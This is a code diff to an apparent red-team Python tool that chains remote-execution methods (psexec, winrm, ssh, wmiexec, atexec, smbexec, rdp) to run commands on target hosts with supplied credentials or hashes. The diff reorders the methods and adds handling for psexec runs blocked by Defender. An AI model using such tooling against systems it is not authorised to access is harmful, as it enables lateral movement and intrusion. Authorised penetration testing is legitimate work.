@@ -19,7 +19,7 @@ MAX_THREADS = 10
 VERBOSE = False
 OUTPUT = False
 
-VALID_TOOLS = ["psexec", "winrm", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
+VALID_TOOLS = ["winrm", "psexec", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
 NXC_TOOLS = ["winrm", "smbexec", "rdp"]
 
 print_lock = threading.Lock()
@@ -200,7 +200,7 @@ def build_cmd(tool, user, target, credential, command, show_output=False):
     raise Exception(f"Unknown tool: {tool}")
 
 def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
-    chain = tool_list if tool_list else ["psexec", "winrm", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
+    chain = tool_list if tool_list else ["winrm", "psexec", "ssh", "wmiexec", "atexec", "smbexec", "rdp"]
 
     for tool in chain:
         # Can't pass the hash with SSH
@@ -227,9 +227,19 @@ def run_chain(user, ip, credential, command, tool_list=None, show_output=False):
             continue
 
         # psexec can have [-] if some shares are writeable and others arent
-        if tool == "psexec" and not "Found writable share" in out:
-            safe_print(f"  [-] For {ip}: {tool} failed.")
-            continue
+        if tool == "psexec":
+            if "Found writable share" in out:
+                if "Stopping service" in out:
+                    # psexec succeeded and exited (sometimes with rc 1!)
+                    return (tool, out, cmd)
+                else:
+                    # if "Stopping service" not detected, defender likely caught binary, so it hangs
+                    safe_print(f"  [-] For {ip}: {tool} auth succeeded, but timed out likely due to defender.")
+                    continue
+            else:
+                # made it through psexec, but no writeable shares found (will return rc 0)
+                safe_print(f"  [-] For {ip}: {tool} failed.")
+                continue
 
         if (tool == "winrm" or tool == "smbexec" or tool == "atexec") and '[-]' in out:
             safe_print(f"  [-] For {ip}: {tool} failed.")
@@ -353,7 +363,7 @@ def impacket_cmd(tool):
     return f"{tool}.py"
 
 def main():
-    global VERBOSE, OUTPUT, MAX_THREADS
+    global VERBOSE, OUTPUT, MAX_THREADS 
 
     check_dependencies()
 
